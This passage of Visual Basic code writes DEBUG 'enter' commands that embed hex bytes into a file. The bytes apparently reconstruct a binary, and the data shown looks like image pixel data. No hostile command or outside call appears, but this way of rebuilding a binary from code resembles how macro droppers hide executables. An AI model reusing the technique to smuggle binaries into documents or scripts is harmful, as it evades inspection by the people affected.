Print #hFile, "E 0E10 6C 52 5B 5F 51 5A 5E 59 62 66 54 5D 61 59 62 66"
Print #hFile, "E 0E20 5D 66 6A 64 6D 71 6A 70 77 58 60 67 48 4F 58 47"
Print #hFile, "E 0E30 50 59 5D 67 6E 53 5D 64 5F 67 6E 67 6B 70 4F 4E"
Print #hFile, "E 0E40 52 15 10 12 1B 12 15 1D 12 14 18 10 11 12 0C 0D"
Print #hFile, "E 0E50 0D 07 08 0B 05 06 0D 07 08 11 0B 0C 13 0E 0F 15"
Print #hFile, "E 0E60 10 11 1E 19 1A 02 00 00 65 63 63 FF FF FF FF FD"
Print #hFile, "E 0E70 FD FF FF FF FE FE FE F9 FB FC E0 E5 E8 D5 DB E0"
Print #hFile, "E 0E80 B7 BD C2 C1 C7 CC DF E5 EA E9 ED F2 E6 EB EE D9"
Print #hFile, "E 0E90 DC E0 E1 E2 E6 EF F1 F2 F3 F2 F4 E7 E6 E8 CD CC"
Print #hFile, "E 0EA0 CE 39 38 3A 05 05 05 0D 0C 0E 02 00 03 12 11 15"
Print #hFile, "E 0EB0 50 51 55 68 6D 70 5A 63 67 5B 67 6B 5B 67 6B 59"
Print #hFile, "E 0EC0 65 69 44 4D 51 36 3C 41 49 4E 51 27 2A 2E 11 15"
Print #hFile, "E 0ED0 16 04 06 06 02 07 06 31 37 36 5D 69 6B 5F 6B 6F"
Print #hFile, "E 0EE0 5C 68 6C 57 63 67 56 62 66 57 63 67 51 5C 60 46"
Print #hFile, "E 0EF0 51 55 48 53 57 44 4F 53 3B 44 48 3E 47 4B 3E 47"
Print #hFile, "E 0F00 4B 38 41 45 3D 46 4A 3C 45 49 3F 48 4B 3A 44 44"
Print #hFile, "E 0F10 37 41 41 3A 44 44 33 3D 3D 00 01 01 00 00 F4 F2"
Print #hFile, "E 0F20 F1 F1 EF EE E2 E2 E2 D4 D4 D4 C2 C4 C5 B1 B3 B4"
Print #hFile, "E 0F30 00 00 03 58 5B 5F 57 5A 5F 4B 4F 54 4C 52 59 4D"
Print #hFile, "E 0F40 54 5D 4E 55 5E 4D 54 5D 4B 52 5B 54 5D 66 59 63"
Print #hFile, "E 0F50 6A 59 63 6A 5A 64 6B 57 61 68 51 5B 62 4D 57 5E"
Print #hFile, "E 0F60 50 5A 61 57 61 68 60 6A 71 64 6E 75 57 61 68 5A"
Print #hFile, "E 0F70 64 6B 60 6A 71 50 5A 61 4C 56 5D 55 5F 66 5F 69"
Print #hFile, "E 0F80 70 5C 66 6D 5C 66 6D 60 6A 71 5F 66 6F 52 5B 64"
Print #hFile, "E 0F90 4C 57 5F 51 5C 64 67 72 7A 56 62 68 66 6E 75 69"
Print #hFile, "E 0FA0 6D 72 40 3F 43 06 00 02 1C 11 14 19 0B 0F 17 0F"
Print #hFile, "E 0FB0 10 13 0B 0C 0F 07 08 0E 06 07 0E 08 09 13 0D 0E"
Print #hFile, "E 0FC0 16 10 11 17 12 13 0A 05 06 0E 09 0A E8 E3 E4 FF"
Print #hFile, "E 0FD0 FC FD FA F8 F8 FC FA FA FC FA FA F8 FA FB B0 B6"
Print #hFile, "E 0FE0 BB E1 E9 F0 D0 D8 DF BB C3 CA CF D8 DC E1 E7 EC"
Print #hFile, "E 0FF0 E3 E7 EC D3 D8 DB DD E0 E4 ED F0 F4 EC ED F1 DB"
Print #hFile, "E 1000 DC E0 D8 D7 D9 61 60 62 0A 07 09 0D 0A 0C 0B 05"
Print #hFile, "E 1010 0A 06 02 08 44 44 4A 6A 6E 73 5C 66 6D 5A 66 6C"
Print #hFile, "E 1020 52 60 66 4B 59 5F 44 50 56 35 40 44 45 4C 4F 25"
Print #hFile, "E 1030 2A 2D 1A 1E 1F 0E 13 12 01 03 03 17 1C 1D 4F 5B"
Print #hFile, "E 1040 5F 51 5F 65 50 5E 64 4C 5A 60 4E 5C 62 52 60 66"
Print #hFile, "E 1050 4E 5A 60 43 4F 55 4A 56 5C 43 4F 55 38 42 49 3C"
Print #hFile, "E 1060 46 4D 40 4A 51 3C 46 4D 41 4B 52 3E 49 4D 3B 47"
Print #hFile, "E 1070 49 35 41 41 33 3F 3F 3C 48 48 31 3D 3D 00 01 01"
Print #hFile, "E 1080 00 00 FD FB FA EC ED EB D8 D8 D8 CC CE CE C5 C7"
Print #hFile, "E 1090 C8 B2 B6 B7 05 08 0C 52 57 5A 54 58 5D 49 4F 54"
Print #hFile, "E 10A0 4C 54 5B 4D 54 5D 50 57 60 52 59 62 48 51 5B 4B"
Print #hFile, "E 10B0 54 5D 5D 66 6F 66 70 77 67 71 78 5C 66 6D 51 5B"
Print #hFile, "E 10C0 62 4E 58 5F 4D 57 5E 4B 55 5C 60 6A 71 67 71 78"
Print #hFile, "E 10D0 5D 67 6E 65 6F 76 6D 77 7E 5C 66 6D 58 62 69 61"
Print #hFile, "E 10E0 6B 72 5C 66 6D 58 62 69 63 6D 74 6D 77 7E 63 6C"
Print #hFile, "E 10F0 75 53 5E 66 4B 58 60 46 56 5D 53 63 6A 52 60 66"
Print #hFile, "E 1100 5F 69 70 5D 63 68 40 3F 43 05 00 01 1D 0F 13 21"
Print #hFile, "E 1110 13 15 18 0D 0F 12 0A 0B 0F 07 08 0F 07 08 10 0A"
Print #hFile, "E 1120 0B 13 0E 0F 16 12 11 18 13 14 09 04 05 85 80 82"
Print #hFile, "E 1130 FF FD FF FF FC FF FF FE FF FF FE FF FD FC FF DA"
Print #hFile, "E 1140 DD E5 68 70 7D DD E6 F3 F1 F6 FF C8 CB D3 CA CE"
Print #hFile, "E 1150 D3 DA DE E3 DE E2 E7 D0 D4 D9 DC DF E3 EF F2 F6"
Print #hFile, "E 1160 F0 F1 F5 DC DD E1 DE DD DF 73 72 74 04 01 03 0D"
Print #hFile, "E 1170 08 0A 0F 09 0E 02 0F 13 3A 3A 40 68 6C 71 5B 63"
Print #hFile, "E 1180 6A 57 63 69 51 5F 65 4A 58 5E 46 54 5A 40 4C 50"
Print #hFile, "E 1190 4D 56 5A 28 2F 32 1A 1F 20 0E 12 13 00 00 00 07"
Print #hFile, "E 11A0 0B 0C 4B 57 59 4D 5C 5F 4E 5D 60 4C 5B 5E 51 60"
Print #hFile, "E 11B0 63 58 66 6C 53 61 67 48 56 5C 52 60 66 48 56 5C"
Print #hFile, "E 11C0 3A 46 4C 3B 47 4D 3C 48 4E 37 41 48 39 43 4A 36"
Print #hFile, "E 11D0 3F 43 3E 47 4A 3A 44 44 35 3F 3F 3C 46 46 2C 36"
Print #hFile, "E 11E0 36 00 01 01 00 00 F7 F8 F6 EA ED EB DD DF DF CE"
Print #hFile, "E 11F0 D0 D0 C2 C4 C5 B7 BB BC 00 00 03 55 5A 5D 56 5A"
Print #hFile, "E 1200 5F 51 57 5C 59 61 68 60 68 6F 52 5B 64 49 52 5B"
Print #hFile, "E 1210 4F 58 61 55 5E 67 53 5C 65 58 61 6A 6C 75 7E 62"
Print #hFile, "E 1220 6B 74 5B 64 6D 5D 66 6F 50 59 62 58 61 6A 67 70"
Print #hFile, "E 1230 79 6A 73 7C 74 7D 86 60 69 72 5C 65 6E 68 71 7A"
Print #hFile, "E 1240 44 95 98 25 CC C9 59 70 78 5C 65 6E 5C 65 6E 63"
Print #hFile, "E 1250 6C 75 64 6E 78 53 5F 69 4F 61 68 63 75 7C 59 6D"
Print #hFile, "E 1260 72 59 6C 71 63 72 75 6D 74 77 2A 29 2B 0F 07 08"
Print #hFile, "E 1270 15 96 92 1B 4B 49 20 14 14 14 0A 0A 09 00 03 12"
Print #hFile, "E 1280 0B 0E 04 00 00 15 13 12 12 13 0F 00 01 00 11 0C"
Print #hFile, "E 1290 0E F7 F0 F5 FF FC FF FF F9 FF FF FD FF FF FD FF"
Print #hFile, "E 12A0 F4 F6 FF C1 C8 D9 17 1F 3C E2 E9 FF AB F6 FA 50"
Print #hFile, "E 12B0 F3 F0 62 E7 E6 8C E5 E7 CD E0 E4 D0 D5 D8 DE E2"
Print #hFile, "E 12C0 E3 E8 EC ED E9 E9 EF EB EB F1 DF E1 E2 9C 9C 9C"
Print #hFile, "E 12D0 04 00 01 10 09 0C 0E 08 0D 09 BB B6 18 17 1B 69"
Print #hFile, "E 12E0 6C 70 6B 71 76 54 5F 63 4F 5D 63 56 64 6A 50 5E"
Print #hFile, "E 12F0 64 3F 4B 4F 48 53 57 3C 45 48 1B 20 21 23 25 26"
Print #hFile, "E 1300 00 00 00 00 00 00 35 3D 3C 54 5F 5D 51 5D 5D 3F"
Print #hFile, "E 1310 59 59 32 94 92 2D AA A8 1D C5 C1 19 CF CA 19 CF"
Print #hFile, "E 1320 CA 22 AE AC 2C 8C 8D 40 59 5F 40 4B 4F 3A 43 47"
Print #hFile, "E 1330 36 3F 43 38 3F 42 3F 44 45 42 47 48 3B 40 41 3A"
Print #hFile, "E 1340 3F 40 33 38 39 00 00 01 00 00 F4 F7 F5 EB EE EC"
Print #hFile, "E 1350 DE E0 E0 CE D0 D0 BF C3 C4 B6 BA BB 00 00 03 58"
Print #hFile, "E 1360 5D 60 50 56 5B 54 5A 5F 5A 62 69 57 5F 66 4C 55"
Print #hFile, "E 1370 5E 4F 58 61 57 60 69 57 60 69 55 5E 67 58 61 6A"
Print #hFile, "E 1380 69 72 7B 63 6C 75 5D 66 6F 59 62 6B 4D 56 5F 5B"
Print #hFile, "E 1390 64 6D 5E 67 70 5D 66 6F 66 6F 78 5A 63 6C 5A 63"
Print #hFile, "E 13A0 6C 4F 91 96 09 F7 EF 09 F7 EF 2F B9 B9 5D 66 6F"
Print #hFile, "E 13B0 5C 65 6E 5D 68 70 59 63 6D 4B 5A 63 4C 5E 65 5A"
Print #hFile, "E 13C0 6D 74 5D 73 78 5B 70 72 61 70 73 62 6C 6C 22 21"
Print #hFile, "E 13D0 23 0C 04 05 09 F7 EF 15 84 81 16 0A 08 1E 14 14"
Print #hFile, "E 13E0 15 09 0F 0E 07 0C 11 0C 0D 0A 08 07 1A 1B 17 01"
Print #hFile, "E 13F0 02 00 9A 97 99 FF FD FF FF F9 FF FF F8 FF FF FC"
Print #hFile, "E 1400 FF FD FC FF F5 FA FF 9F A9 C1 10 19 3E 8C DB F0"
Print #hFile, "E 1410 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 15 F6 EE 6B"
Print #hFile, "E 1420 E5 E3 E0 E4 E5 EA EE EF EC EC F2 EA EA F0 E6 E8"
Print #hFile, "E 1430 E9 A9 A8 AA 06 00 02 0E 07 0A 0E 35 38 09 F7 EF"
Print #hFile, "E 1440 08 7F 7D 54 57 5B 61 67 6C 53 5E 62 59 65 6B 60"
Print #hFile, "E 1450 6E 74 4C 5A 60 41 50 53 39 44 48 37 40 43 1E 23"
Print #hFile, "E 1460 24 1B 1D 1E 16 16 16 00 00 00 1E 25 22 4E 57 54"
Print #hFile, "E 1470 44 7A 77 0D EE E6 09 F7 EF 09 F7 EF 09 F7 EF 09"
Print #hFile, "E 1480 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 19 C0"
Print #hFile, "E 1490 BC 27 86 86 35 4A 4D 37 3E 41 3E 43 44 42 46 47"
Print #hFile, "E 14A0 42 46 47 40 44 45 38 3C 3D 00 03 04 00 00 F4 F7"
Print #hFile, "E 14B0 F5 EC EF ED DF E1 E1 CF D1 D1 BE C2 C3 B6 BA BB"
Print #hFile, "E 14C0 00 02 05 5C 61 64 58 5E 63 54 5A 5F 51 59 60 50"
Print #hFile, "E 14D0 58 5F 4A 53 5C 4D 56 5F 52 5B 64 52 5B 64 55 7B"
Print #hFile, "E 14E0 81 41 92 96 60 69 72 5C 65 6E 57 60 69 4F 58 61"
Print #hFile, "E 14F0 4E 57 60 6A 73 7C 66 6F 78 5E 67 70 65 6E 77 60"
Print #hFile, "E 1500 69 72 63 6C 75 28 CF CC 09 F7 EF 09 F7 EF 09 F7"
Print #hFile, "E 1510 EF 55 7B 82 5E 67 70 5D 68 70 59 63 6D 56 65 6E"
Print #hFile, "E 1520 59 6B 72 59 6C 73 62 76 7B 5C 6F 72 5E 6A 6E 56"
Print #hFile, "E 1530 5E 5E 18 17 19 0C 04 05 09 F7 EF 16 86 82 1B 0E"
Print #hFile, "E 1540 0C 0D 03 03 0A 00 02 0B 01 07 14 0E 0F 14 12 11"
Print #hFile, "E 1550 02 03 01 11 12 10 FB F8 FA FF FD FF FE F4 FA FF"
Print #hFile, "E 1560 FC FF FF F9 FF FB FC FF F3 F9 FF 73 7E 9A 1C 26"
Print #hFile, "E 1570 4E 1C EE EC 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF"
Print #hFile, "E 1580 09 F7 EF 09 F7 EF 3E F2 ED DC EE F1 EF EE F7 E7"
Print #hFile, "E 1590 E6 EF ED EE F2 BD BC C0 0B 05 0A 0A 03 08 0D 91"
Print #hFile, "E 15A0 8D 09 F7 EF 07 BA B5 46 49 4D 63 69 6E 54 5F 63"
Print #hFile, "E 15B0 52 5E 64 52 60 66 4F 5D 63 49 58 5B 2A 43 47 21"
Print #hFile, "E 15C0 8E 8C 32 37 38 1E 20 21 2C 2C 2C 00 00 00 01 08"
Print #hFile, "E 15D0 05 3F 48 45 23 BD B7 09 F7 EF 09 F7 EF 09 F7 EF"
Print #hFile, "E 15E0 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09"
Print #hFile, "E 15F0 F7 EF 09 F7 EF 09 F7 EF 0B EC E4 17 AF AB 33 55"
Print #hFile, "E 1600 55 3C 41 42 44 49 4A 41 46 47 38 3D 3E 00 03 04"
Print #hFile, "E 1610 00 00 F4 F7 F5 EC EF ED E0 E2 E2 CF D1 D1 BD C1"
Print #hFile, "E 1620 C2 B5 B9 BA 00 03 06 5F 64 67 61 67 6C 50 56 5B"
Print #hFile, "E 1630 49 51 58 53 5B 62 55 5E 67 51 5A 63 53 5C 65 59"
Print #hFile, "E 1640 62 6B 24 CB C8 09 F7 EF 47 89 8E 60 69 72 5C 65"
Print #hFile, "E 1650 6E 4A 53 5C 4C 55 5E 6B 74 7D 64 6D 76 56 5F 68"
Print #hFile, "E 1660 5C 65 6E 5E 67 70 5B 73 7B 09 F7 EF 09 F7 EF 09"
Print #hFile, "E 1670 F7 EF 09 F7 EF 28 C1 BF 65 6E 77 5D 68 70 4B 55"
Print #hFile, "E 1680 5F 4A 59 62 56 68 6F 55 68 6F 5F 73 78 59 6A 6D"
Print #hFile, "E 1690 58 64 68 48 50 50 10 0F 11 0E 44 42 09 F7 EF 19"
Print #hFile, "E 16A0 88 85 1E 11 0F 14 08 08 18 0A 0E 12 09 0C 12 0B"
Print #hFile, "E 16B0 0E 18 16 16 00 00 00 98 98 98 FF FE FF FF FA FC"
Print #hFile, "E 16C0 FF FB FE FF FD FF FE FA FF FA FC FF E3 EB FF 5A"
Print #hFile, "E 16D0 65 85 29 8A A1 09 F7 EF 09 F7 EF 09 F7 EF 09 F7"
Print #hFile, "E 16E0 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 33 F5 F0"
Print #hFile, "E 16F0 E1 EF F7 E4 E3 EC EF EF F5 CE CD D1 16 10 15 05"
Print #hFile, "E 1700 00 03 0A CC C5 09 F7 EF 07 BA B5 36 39 3D 69 6F"
Print #hFile, "E 1710 74 59 64 68 4B 57 5D 48 56 5C 4F 5D 63 52 60 66"
Print #hFile, "E 1720 12 D6 D0 09 F7 EF 39 78 78 25 29 2A 2B 2A 2C 08"
Print #hFile, "E 1730 0A 0A 00 02 00 28 31 2E 0D ED E6 09 F7 EF 09 F7"
Print #hFile, "E 1740 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF"
Print #hFile, "E 1750 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09"
Print #hFile, "E 1760 F7 EF 0B EC E4 2F 5F 5F 42 47 48 3F 44 45 34 39"
Print #hFile, "E 1770 3A 00 00 01 00 00 F4 F7 F5 EC EF ED E0 E2 E2 CF"
Print #hFile, "E 1780 D1 D1 BD C1 C2 B5 B9 BA 00 03 06 5F 64 67 55 5B"
Print #hFile, "E 1790 60 52 58 5D 50 58 5F 56 5E 65 5B 64 6D 5E 67 70"
Print #hFile, "E 17A0 62 6B 74 63 7A 82 09 F7 EF 09 F7 EF 21 C8 C6 61"
Print #hFile, "E 17B0 6A 73 5C 65 6E 4A 53 5C 51 5A 63 6A 73 7C 5E 67"
Print #hFile, "E 17C0 70 51 5A 63 56 5F 68 5B 64 6D 42 93 96 09 F7 EF"
Print #hFile, "E 17D0 09 F7 EF 09 F7 EF 09 F7 EF 0E EF E8 68 71 7A 5E"
Print #hFile, "E 17E0 69 71 4A 54 5E 4B 5A 63 55 67 6E 4F 61 68 5D 70"
Print #hFile, "E 17F0 75 58 67 6A 55 60 64 3F 44 45 0D 0A 0C 11 46 45"
Print #hFile, "E 1800 09 F7 EF 10 BF BA 20 13 11 28 1C 1C 1E 11 13 15"
Print #hFile, "E 1810 0A 0D 22 19 1C 04 00 01 1D 1A 1C F4 F3 F5 FF FB"
Print #hFile, "E 1820 FF FF FE FF FF FF FE E0 FD FB FC FD FF F6 FC FF"
Print #hFile, "E 1830 C1 CC E8 56 63 89 22 CA D3 09 F7 EF 09 F7 EF 09"
Print #hFile, "E 1840 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7"
Print #hFile, "E 1850 EF 09 F7 EF 5D F3 F2 DF E1 E9 EA EA F0 D6 D4 DA"
Print #hFile, "E 1860 27 23 29 04 00 04 09 F7 EF 09 F7 EF 07 BA B5 1C"
Print #hFile, "E 1870 1D 21 64 68 6D 64 6D 71 56 60 67 5A 66 6C 46 54"
Print #hFile, "E 1880 5A 37 99 9A 09 F7 EF 09 F7 EF 1D C4 BF 2A 2E 2F"
Print #hFile, "E 1890 1A 1C 1D 27 29 29 00 02 00 0D 41 3D 09 F7 EF 09"
Print #hFile, "E 18A0 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7"
Print #hFile, "E 18B0 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF"
Print #hFile, "E 18C0 09 F7 EF 09 F7 EF 09 F7 EF 1F 9B 97 3F 47 47 3C"
Print #hFile, "E 18D0 44 44 31 39 39 00 01 01 00 00 F4 F7 F5 EC EF ED"
Print #hFile, "E 18E0 DF E1 E1 CF D1 D1 BE C2 C3 B6 BA BB 00 02 05 5C"
Print #hFile, "E 18F0 61 64 45 4B 50 59 5F 64 5B 63 6A 4E 56 5D 4D 56"
Print #hFile, "E 1900 5F 5B 64 6D 61 6A 73 44 95 98 09 F7 EF 09 F7 EF"
Print #hFile, "E 1910 09 F7 EF 5D 66 6F 57 60 69 4B 54 5D 5B 64 6D 68"
Print #hFile, "E 1920 71 7A 61 6A 73 59 62 6B 5E 67 70 5E 67 70 2A B5"
Print #hFile, "E 1930 B4 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF"
Print #hFile, "E 1940 45 96 9A 5E 69 71 58 62 6C 62 6E 78 66 76 7D 54"
Print #hFile, "E 1950 66 6D 61 71 77 59 68 6B 55 60 64 37 3C 3D 08 05"
Print #hFile, "E 1960 07 13 48 47 09 F7 EF 10 BF B9 23 16 14 25 17 18"
Print #hFile, "E 1970 1F 13 13 27 1C 1E 2D 24 27 04 00 01 9C 98 9D FF"
Print #hFile, "E 1980 FE FF FF FC FF FF FF FF E0 FD F9 17 F7 EF EC FD"
Print #hFile, "E 1990 FE EF F6 FF 97 A2 C2 5B 68 94 0F EF EB 09 F7 EF"
Print #hFile, "E 19A0 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09"
Print #hFile, "E 19B0 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 82 EB ED E0 DF"
Print #hFile, "E 19C0 E8 D7 D4 DD 40 3B 44 04 00 06 09 F7 EF 09 F7 EF"
Print #hFile, "E 19D0 07 BA B5 07 08 0C 53 57 5C 66 6F 73 5D 67 6E 60"
Print #hFile, "E 19E0 6C 72 47 53 59 11 E4 DD 09 F7 EF 09 F7 EF 09 F7"
Print #hFile, "E 19F0 EF 34 39 3C 14 18 19 34 38 39 06 0C 0B 04 6E 69"
Print #hFile, "E 1A00 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09"
Print #hFile, "E 1A10 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7"
Print #hFile, "E 1A20 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 22 9D 99"
Print #hFile, "E 1A30 40 48 48 40 48 48 37 3F 3F 00 02 02 00 00 F4 F7"
Print #hFile, "E 1A40 F5 EB EE EC DE E0 E0 CE D0 D0 BF C3 C4 B6 BA BB"
Print #hFile, "E 1A50 00 00 03 58 5D 60 4D 53 58 5D 63 68 58 60 67 4A"
Print #hFile, "E 1A60 52 59 49 52 5B 51 5A 63 53 5C 65 2D A9 AA 09 F7"
Print #hFile, "E 1A70 EF 09 F7 EF 09 F7 EF 4A 8D 91 58 61 6A 52 5B 64"
Print #hFile, "E 1A80 63 6C 75 5E 67 70 5B 64 6D 5B 64 6D 63 6C 75 5D"
Print #hFile, "E 1A90 66 6F 1A D0 CC 09 F7 EF 09 F7 EF 09 F7 EF 09 F7"
Print #hFile, "E 1AA0 EF 09 F7 EF 30 BA B9 5E 69 71 57 61 6B 5F 6B 75"
Print #hFile, "E 1AB0 67 77 7E 60 70 77 62 70 76 5A 66 6A 56 5F 63 31"
Print #hFile, "E 1AC0 35 36 05 02 04 15 4B 4A 09 F7 EF 0F BF B9 1F 11"
Print #hFile, "E 1AD0 12 20 12 13 26 18 19 2C 20 20 07 00 00 1D 17 1C"
Print #hFile, "E 1AE0 F0 EC F2 FC FA FF FE FA FF FE FC FC 9C F6 EF 09"
Print #hFile, "E 1AF0 F7 EF 9E FB F9 E5 EE FF 77 84 AA 52 8C B1 09 F7"
Print #hFile, "E 1B00 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF"
Print #hFile, "E 1B10 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 16"
Print #hFile, "E 1B20 F6 EF BC D9 E1 D4 D0 DB 57 53 5E 02 00 06 09 F7"
Print #hFile, "E 1B30 EF 09 F7 EF 09 BC B6 00 00 01 41 44 48 63 69 6E"
Print #hFile, "E 1B40 5E 66 6D 53 5F 65 3D 81 84 09 F7 EF 09 F7 EF 09"
Print #hFile, "E 1B50 F7 EF 09 F7 EF 44 49 4C 23 26 2A 27 2B 2C 1E 24"
Print #hFile, "E 1B60 23 04 7D 78 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF"
Print #hFile, "E 1B70 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09"
Print #hFile, "E 1B80 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7"
Print #hFile, "E 1B90 EF 26 94 90 3C 46 46 41 4B 4B 39 43 43 00 03 03"
Print #hFile, "E 1BA0 00 00 F5 F8 F6 EA ED EB DD DF DF CE D0 D0 C0 C4"
Print #hFile, "E 1BB0 C5 B7 BB BC 00 00 03 55 5A 5D 61 67 6C 5A 60 65"
Print #hFile, "E 1BC0 4F 57 5E 52 5A 61 59 62 6B 54 5D 66 50 59 62 26"
Print #hFile, "E 1BD0 BF BE 09 F7 EF 09 F7 EF 09 F7 EF 31 AD AE 50 59"
Print #hFile, "E 1BE0 62 53 5C 65 6C 75 7E 5E 67 70 56 5F 68 5D 66 6F"
Print #hFile, "E 1BF0 6A 73 7C 66 6F 78 0E EE E7 09 F7 EF 09 F7 EF 09"
Print #hFile, "E 1C00 F7 EF 09 F7 EF 09 F7 EF 21 D7 D3 65 70 78 5E 68"
Print #hFile, "E 1C10 72 61 6D 77 66 76 7D 63 70 78 60 6E 74 58 63 67"
Print #hFile, "E 1C20 55 5B 60 2E 30 31 05 00 02 18 4E 4C 09 F7 EF 0B"
Print #hFile, "E 1C30 EA E3 23 15 16 2B 1D 1E 20 13 11 25 19 17 07 00"
Print #hFile, "E 1C40 00 81 7B 80 FF FC FF FF FC FF FF FD FF FF FE FD"
Print #hFile, "E 1C50 81 F8 F1 09 F7 EF 7D F8 F7 DF E9 FF 6B 7B A5 48"
Print #hFile, "E 1C60 AC CB 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7"
Print #hFile, "E 1C70 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF"
Print #hFile, "E 1C80 09 F7 EF 09 F7 EF 47 EA E8 D1 CD D8 67 63 6F 03"
Print #hFile, "E 1C90 00 0A 09 F7 EF 09 F7 EF 0A BD B7 00 00 01 30 33"
Print #hFile, "E 1CA0 37 5F 66 69 60 69 6D 4F 59 60 24 BE BB 09 F7 EF"
Print #hFile, "E 1CB0 09 F7 EF 09 F7 EF 0C EC E5 47 4E 51 30 35 38 16"
Print #hFile, "E 1CC0 1B 1C 2F 37 36 04 7D 78 09 F7 EF 09 F7 EF 09 F7"
Print #hFile, "E 1CD0 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF"
Print #hFile, "E 1CE0 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09"
Print #hFile, "E 1CF0 F7 EF 09 F7 EF 34 5A 59 38 42 42 41 4B 4B 3A 44"
Print #hFile, "E 1D00 44 00 01 01 00 00 F7 FA F8 ED F0 EE DE E0 E0 D0"
Print #hFile, "E 1D10 D2 D2 C1 C5 C6 B2 B6 B7 00 00 03 66 6B 6E 5F 65"
Print #hFile, "E 1D20 6A 4A 50 55 51 59 60 59 61 68 44 4D 56 45 4E 57"
Print #hFile, "E 1D30 59 62 6B 1E D3 D0 09 F7 EF 09 F7 EF 09 F7 EF 23"
Print #hFile, "E 1D40 CA C7 39 42 4B 5A 63 6C 6A 73 7C 58 61 6A 63 6C"
Print #hFile, "E 1D50 75 5E 67 70 5F 68 71 60 69 72 09 F7 EF 09 F7 EF"
Print #hFile, "E 1D60 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 5F"
Print #hFile, "E 1D70 6A 72 67 71 7B 70 7C 86 62 6F 77 59 66 6E 57 63"
Print #hFile, "E 1D80 69 5E 67 6B 63 67 6C 16 15 17 0A 05 07 19 4E 4D"
Print #hFile, "E 1D90 09 F7 EF 09 F7 EF 24 17 19 19 0C 0E 2F 23 21 0D"
Print #hFile, "E 1DA0 04 01 10 08 09 EA E5 E7 FF FB FF FF FC FF FF FE"
Print #hFile, "E 1DB0 FF FF FF FE 44 F8 F0 09 F7 EF 7E FA F7 AD B9 D5"
Print #hFile, "E 1DC0 6F 7F AD 3E BF D6 09 F7 EF 09 F7 EF 09 F7 EF 09"
Print #hFile, "E 1DD0 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7"
Print #hFile, "E 1DE0 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 9A D3 D9"
Print #hFile, "E 1DF0 87 85 91 06 02 0D 09 F7 EF 09 F7 EF 0A BC B6 00"
Print #hFile, "E 1E00 00 01 03 06 0A 5E 65 68 69 72 76 61 89 8B 09 F7"
Print #hFile, "E 1E10 EF 09 F7 EF 09 F7 EF 09 F7 EF 14 C9 C4 47 4D 52"
Print #hFile, "E 1E20 44 4A 4F 1A 21 24 29 31 30 19 95 8F 09 F7 EF 09"
Print #hFile, "E 1E30 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7"
Print #hFile, "E 1E40 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF"
Print #hFile, "E 1E50 09 F7 EF 0D ED E6 28 88 85 3D 47 47 33 3D 3D 31"
Print #hFile, "E 1E60 3B 3B 3E 48 48 00 01 01 00 00 F4 F7 F5 EA ED EB"
Print #hFile, "E 1E70 DC DE DE CF D1 D1 C2 C6 C7 B4 B8 B9 00 02 05 6A"
Print #hFile, "E 1E80 6F 72 56 5C 61 52 58 5D 5B 63 6A 4C 54 5B 42 4B"
Print #hFile, "E 1E90 54 5E 67 70 68 71 7A 09 F7 EF 09 F7 EF 09 F7 EF"
Print #hFile, "E 1EA0 09 F7 EF 13 E5 DF 45 4E 57 64 6D 76 6E 77 80 5A"
Print #hFile, "E 1EB0 63 6C 5B 64 6D 57 60 69 58 61 6A 46 88 8D 09 F7"
Print #hFile, "E 1EC0 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF"
Print #hFile, "E 1ED0 09 F7 EF 4E 84 89 5D 69 73 66 72 7C 64 71 79 65"
Print #hFile, "E 1EE0 70 78 5D 67 6E 60 66 6B 58 5B 60 0D 0C 0E 0B 06"
Print #hFile, "E 1EF0 08 1B 50 4F 09 F7 EF 09 F7 EF 1E 10 14 26 1B 1D"
Print #hFile, "E 1F00 1F 13 11 09 00 00 68 63 62 FF FB FD FF FB FF FF"
Print #hFile, "E 1F10 FD FF FD FD FD FF FF FE 45 F9 F2 09 F7 EF 6B F5"
Print #hFile, "E 1F20 F6 8A 97 B7 5D 6E 9F 22 DA E2 09 F7 EF 09 F7 EF"
Print #hFile, "E 1F30 09 F7 EF 09 F7 EF 15 F5 EF 8A C5 CB BD BD C9 88"
Print #hFile, "E 1F40 D4 D9 15 F5 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7"
Print #hFile, "E 1F50 EF 39 EC E8 8E 8B 9A 13 12 1C 09 F7 EF 09 F7 EF"
Print #hFile, "E 1F60 0A BC B6 00 01 01 01 05 06 48 4D 50 64 6A 6F 38"
